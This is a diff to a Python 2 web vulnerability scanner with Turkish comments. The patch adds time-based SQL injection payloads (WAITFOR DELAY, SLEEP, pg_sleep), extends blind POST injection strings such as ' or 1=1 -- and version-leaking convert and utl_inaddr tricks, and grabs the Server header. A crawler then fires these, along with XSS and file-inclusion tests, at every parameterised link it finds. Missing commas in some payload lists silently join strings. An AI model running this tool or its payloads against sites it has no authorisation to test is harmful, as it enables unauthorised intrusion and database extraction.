@@ -12,7 +12,7 @@
 #butun sonuclari rapor.txt ye kaydeder
 #sadece guvenlik testleri icin kullanin
 #cookie ve proxy destegide vardir.
-
+#https://twitter.com/0x94
 import urllib
 import urlparse
 import sys
@@ -23,6 +23,7 @@ from urlparse import parse_qsl
 import httplib
 from string import maketrans
 import base64
+import socket
 
 #cookie ayarlamak istiyorsan buraya gir
 sayfacookie=""
@@ -125,7 +126,43 @@ def formyaz(formurl):
 		blindpost(formurl, toplamveri,"GET")
     except:
 	print "Form Degerlerini Alirken Hata olustu"
+
 							
+def timebased(url):
+    timesql=["WAITFOR DELAY '0:0:20';--",
+             "'WAITFOR DELAY '0:0:20';--",
+             "SLEEP(20)",
+             "'SLEEP(20)",
+             "pg_sleep(20)",
+             "'pg_sleep(20)",
+             "PG_DELAY(20)",
+             "'PG_DELAY(20)"
+             "and if(substring(user(),1,1)>=chr(97),SLEEP(20),1)--"
+             "'and if(substring(user(),1,1)>=chr(97),SLEEP(20),1)--"
+             "DBMS_LOCK.SLEEP(20);"]
+    
+    for timeler in timesql:
+	try:
+	    yaz("Time Based SQL Test Yapiliyor ... ",True) 
+	    urlnormal=url.replace("=", "="+urlencode(parse_qsl(timeler)))
+	    urlac = urllib2.urlopen(urlnormal,timeout=19)
+	    response = urlac.read()
+	    sqlkontrol(response,urlnormal)
+		
+	except urllib2.HTTPError,  e:
+	    if(e.code==500):
+		yaz("Http 500 Dondu " +urlnormal,True)
+		
+	except socket.timeout:
+	    yaz("Time BASED SQL Olabilir Cok fazla bekledi",True)
+	    
+	except urllib2.URLError,  e:
+	    mesaj="Time BASED = Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
+	    yaz(mesaj,False)
+	except:
+	    mesaj="Bilinmeyen hata olustu\n"
+	    #yaz(mesaj)       
+
 
 def blindpost(url,params,method):
     
@@ -153,7 +190,7 @@ def blindpost(url,params,method):
 	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
 		#yaz(mesaj)
     except:
-	mesaj="Bilinmeyen hata oluştu\n"    
+	mesaj="Bilinmeyen hata olustu\n"    
 
     
     
@@ -164,10 +201,23 @@ def blindpost(url,params,method):
 		    "' aNd 2=MID((@@version,1,1)--+",
 		    "' aNd 3=MID((@@version,1,1)--+",
 		    "' aNd 4=MID((@@version,1,1)--+",
-		    "' aNd 5=MID((@@version,1,1)--+"]  
+		    "' aNd 5=MID((@@version,1,1)--+",
+		    "' or 1=1 --",
+                    "a' or 1=1 --",
+                    "' or 1=1 #",
+                    "or 1=1 --",
+                    "') or ('x'='x",
+                    "or username LIKE '%a%"
+                    "'HAVING 1=1--"
+                    "' and+1=convert(int,@@version)"
+                    "' or 1=utl_inaddr.get_host_address((select banner from v$version where rownum=1))--",
+                    "'a' || 'b' ",
+                    "' SELECT IF(1=1,'true','false')"
+                    "') or ('1'='1--"
+                    "'GROUP BY 99999"] 
     ipatla=0
     yenidict={}
-    while ipatla < 6:
+    while ipatla < 19:
 	
 	for postcode in post_string:  	    
 	    for k,v in degisecekdict.items():
@@ -193,11 +243,11 @@ def blindpost(url,params,method):
 		mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
 			#yaz(mesaj)
 	    except:
-		mesaj="Bilinmeyen hata oluştu\n"
+		mesaj="Bilinmeyen hata olustu\n"
 			#yaz(mesaj)   
 	    
 	    if (comparePages(y.read(),f.read(),f.geturl())):
-		mesaj="[+] BLind POST Sayfada Degisiklik oldu %s !!![+]" % f.geturl()+"POST DATASI"+postcode
+		mesaj="[+] BLind POST Sayfada Degisiklik oldu %s !!![+]" % f.geturl()+"\nPOST DATASI---------------------------\n"+params+"\n"
 		
 		yaz(mesaj,True)	
 
@@ -225,7 +275,7 @@ def postget(url, params, method):
 	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
 		#yaz(mesaj)
     except:
-	mesaj="Bilinmeyen hata oluştu\n"
+	mesaj="Bilinmeyen hata olustu\n"
 		#yaz(mesaj)       
     
 
@@ -342,7 +392,7 @@ def xsstest(xsstesturl):
 	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,xsstesturl)
 	   #yaz(mesaj)
     except:
-	mesaj="Bilinmeyen hata oluştu\n"           
+	mesaj="Bilinmeyen hata olustu\n"           
 	
 
 def xsstara(xssurl):
@@ -362,7 +412,7 @@ def xsstara(xssurl):
 	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
 	    #yaz(mesaj)
     except:
-	mesaj="Bilinmeyen hata oluştu\n"    
+	mesaj="Bilinmeyen hata olustu\n"    
 
 def lfitara(lfibul):
     
@@ -433,7 +483,7 @@ def lfitara(lfibul):
 	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
 	    #yaz(mesaj)
     except:
-	mesaj="Bilinmeyen hata oluştu\n"
+	mesaj="Bilinmeyen hata olustu\n"
 		#yaz(mesaj)       
     
 
@@ -456,7 +506,7 @@ def lfitest(lfiurl):
 	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
 	    #yaz(mesaj)
     except:
-	mesaj="Bilinmeyen hata oluştu\n"
+	mesaj="Bilinmeyen hata olustu\n"
 	    #yaz(mesaj)       
 
     
@@ -479,7 +529,7 @@ def sql(urlnormal):
 	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
 	#yaz(mesaj)
     except:
-	mesaj="Bilinmeyen hata oluştu\n"
+	mesaj="Bilinmeyen hata olustu\n"
 	#yaz(mesaj)   
 	
 
@@ -490,10 +540,10 @@ def blind(urlblind):
     normalkaynak=linknormal.read()
 
     yaz("Blind Taraniyor ... ",True)
-    true_strings = [" and 1=1"," ' and 1=1"," and 'a'='a","' and 'a'='a","' and 'a'='a"," and 1 like 1"," and 1 like 1/*"," and 1=1--"]           
-    false_strings =[" and 1=2"," ' and 1=2"," and 'a'='b","' and 'a'='b","' and 'a'='b"," and 1 like 2"," and 1 like 2/*"," and 1=2--"]
+    true_strings = [" and 1=1"," ' and 1=1"," and 'a'='a","' and 'a'='a","' and 'a'='a"," and 1 like 1"," and 1 like 1/*"," and 1=1--","group by 1"]           
+    false_strings =[" and 1=2"," ' and 1=2"," and 'a'='b","' and 'a'='b","' and 'a'='b"," and 1 like 2"," and 1 like 2/*"," and 1=2--","group by 99999"]
     i = 0
-    while i < 6:    
+    while i < 7:    
         blindtrue = urlblind + urlencode(parse_qsl(true_strings[i])) 
 	yaz("Denenen Blind : "+true_strings[i],True)
         try:
@@ -512,7 +562,7 @@ def blind(urlblind):
 	    #yaz(mesaj)
 	
 	except:
-	    mesaj="Bilinmeyen hata oluştu\n"
+	    mesaj="Bilinmeyen hata olustu\n"
 	    #yaz(mesaj)
 	    
         blindfalse = urlblind + urlencode(parse_qsl(false_strings[i])) 
@@ -534,15 +584,17 @@ def blind(urlblind):
 	    #yaz(mesaj)
 	
 	except:
-	    mesaj="Bilinmeyen hata oluştu\n"
+	    mesaj="Bilinmeyen hata olustu\n"
 	    #yaz(mesaj)
    
 	
               
 	if (comparePages(html1,normalkaynak,response2.geturl()) > comparePages(html1,html2,linknormal.geturl())):
-		    mesaj="[+] Sayfada Degisiklik oldu %s !!![+]" % urlblind
+		    mesaj="[+] Sayfada Degisiklik oldu %s !!![+]" % urlblind+"\nVERi = "+false_strings[i]+"\n"
 		    yaz(mesaj,True)
  
+
+
     
 class YeniOpener(urllib.FancyURLopener):   
     version = 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15'
@@ -552,6 +604,10 @@ def aynivarmi(keyurl):
 	return True
     else:
 	return False
+
+def headerbilgi(host):
+	urlac = urllib2.urlopen(host)
+	yaz("[#] Makina Bilgisi : "+host+" - "+str(urlac.info().getheader('Server')),True)
 
 def locationbypass(link):
     try:
@@ -603,6 +659,7 @@ def linkler(urltara):
 			    
 			if "?" in tamurl:
 			    sql(tamurl)
+			    timebased(tamurl)
 			    blind(tamurl)
 			    xsstest(tamurl)
 
@@ -624,6 +681,7 @@ def main():
 	ooooo = maketrans(giris, cikis)
 	asd=url.translate(ooooo)
 	if "{}>" not in asd:
+	    headerbilgi(url)
 	    linkler(url)
 
 
